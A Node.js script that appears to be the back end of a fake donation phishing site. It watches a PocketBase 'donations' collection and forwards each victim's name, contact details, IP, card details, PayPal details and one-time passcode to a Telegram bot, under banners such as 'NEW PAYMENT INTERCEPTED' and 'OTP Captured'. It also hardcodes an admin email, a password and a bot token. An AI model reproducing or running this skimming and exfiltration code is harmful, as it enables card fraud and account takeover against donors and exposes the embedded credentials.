import PocketBase from "pocketbase";
import fetch from "node-fetch";
import { EventSource } from "eventsource";
global.EventSource = EventSource;

// PocketBase
const pb = new PocketBase("http://127.0.0.1:8090");

// Admin login (use your real admin email + password)
await pb.collection("_superusers").authWithPassword("johnsnippet27@gmail.com", "Godwetrust@23");
console.log("✅ Authenticated as Admin");

// Telegram Bot config
const TG_TOKEN = "8123701174:AAGTw0X6DCPFHCovKm0LjerreXK38t601b0";
const TG_CHAT_ID = "8391637887";


// Test Telegram connection first
async function testTelegram() {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getMe`);
    const data = await response.json();
    console.log("🤖 Bot Info:", data);
    return data.ok;
  } catch (error) {
    console.error("❌ Telegram connection failed:", error);
    return false;
  }
}

// Test the connection
const telegramWorking = await testTelegram();
console.log(telegramWorking ? "✅ Telegram connection OK" : "❌ Telegram connection failed");

// Simple message function with error handling
async function sendTelegramMessage(text, isUpdate = false) {
  try {
    // Use HTML parse mode instead of MarkdownV2 (more reliable)
    const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TG_CHAT_ID,
        text: text,
        parse_mode: "HTML"
      }),
    });
    
    const result = await response.json();
    console.log(isUpdate ? "📤 Update Message Result:" : "📤 New Message Result:", result);
    
    if (!result.ok) {
      console.error("❌ Telegram API Error:", result);
      // Try without parse_mode as fallback
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TG_CHAT_ID,
          text: text.replace(/<[^>]*>/g, ''), // Remove HTML tags
        }),
      });
    }
    
    return result.ok;
  } catch (error) {
    console.error("❌ Telegram send failed:", error);
    return false;
  }
}

// Subscribe to donations collection
pb.collection("donations").subscribe("*", async (e) => {
  console.log("📩 Donation Event:", e.action, e.record?.id);

  if (e.action === "create") {
    const donation = e.record;

    // Simple HTML format (more reliable)
    const msg = `
<b>🔓 💸 NEW PAYMENT INTERCEPTED 🔓</b>
<b>🟢 DATA STREAM INITIATED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>👤 DONOR IDENTIFIED:</b>
├─ 📛 <b>Name:</b> <code>${donation.Name || 'N/A'}</code>
├─ 📧 <b>Email:</b> <code>${donation.email || 'N/A'}</code>
├─ 📞 <b>Phone:</b> <code>${donation.Phone_number || 'N/A'}</code>
├─ 🌍 <b>Country:</b> <code>${donation.country || 'N/A'}</code>
├─ 🌐 <b>IP Address:</b> <code>${donation.IP || 'N/A'}</code>
└─ 🏠 <b>Address:</b> <code>${donation.Donor_Address || 'N/A'}</code>

<b>📊 TRANSACTION DETAILS:</b>
├─ 🎯 <b>Project:</b> <code>${donation.project || 'N/A'}</code>
├─ 🔄 <b>Payment Type:</b> <code>${donation.Payment_Type || 'N/A'}</code>
├─ 💰 <b>Amount:</b> $<code>${donation.amount || 'N/A'}</code>
├─ 📅 <b>Date Created:</b> <code>${donation.created || 'N/A'}</code>
└─ ⏰ <b>Last Updated:</b> <code>${donation.updated || 'N/A'}</code>

<b>🔐 SECURITY BREACH:</b>
├─ 🎴 <b>Card Details:</b> <code>${donation.Card_details || 'N/A'}</code>
├─ 📱 <b>PayPal Details:</b> <code>${donation.paypal_details || 'N/A'}</code>
└─ 🔢 <b>OTP Captured:</b> <code>${donation.OTP || 'N/A'}</code>

<b>⚠️ NEW DATA STREAM ESTABLISHED ⚠️</b>`;

    // Send Telegram Alert
    const telegramSent = await sendTelegramMessage(msg, false);
    
    if (telegramSent) {
      console.log("✅ Telegram alert sent");
    } else {
      console.log("❌ Telegram alert failed");
    }

  } else if (e.action === "update") {
    const updatedDonation = e.record;
    
    const updateMsg = `
<b>🔓 💸 PAYMENT DATA MODIFIED 🔓</b>
<b>🟡 DATA STREAM UPDATED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>👤 DONOR PROFILE:</b>

├─ 📛 <b>Name:</b> <code>${updatedDonation.Name || 'N/A'}</code>

├─ 📧 <b>Email:</b> <code>${updatedDonation.email || 'N/A'}</code>

├─ 📞 <b>Phone:</b> <code>${updatedDonation.Phone_number || 'N/A'}</code>

└─ 🏠 <b>Address:</b> <code>${updatedDonation.Donor_Address || 'N/A'}</code>


<b>💳 PAYMENT INTELLIGENCE:</b>
├─ 🔄 <b>Payment Type:</b> <code>${updatedDonation.Payment_Type || 'N/A'}</code>

├─ 💰 <b>Amount:</b> $<code>${updatedDonation.amount || 'N/A'}</code>

└─ ⏰ <b>Time Updated:</b> <code>${updatedDonation.updated || 'N/A'}</code>



<b>🔐 SECURITY DATA UPDATED:</b>
├─ 🎴 <b>Card Details:</b> <code>${updatedDonation.Card_details || 'N/A'}</code>


├─ 📱 <b>PayPal Details:</b> <code>${updatedDonation.paypal_details || 'N/A'}</code>


└─ 🔢 <b>OTP Verification:</b> <code>${updatedDonation.OTP || 'N/A'}</code>


<b>⚠️ DATA STREAM MODIFIED CHECK OTP⚠️</b>`;
    
    // Send Telegram Alert
    const telegramSent = await sendTelegramMessage(updateMsg, true);
    
    if (telegramSent) {
      console.log("✅ Update alert sent");
    } else {
      console.log("❌ Update alert failed");
    }
  }
});



console.log("🚀 Donation monitor started... Waiting for events");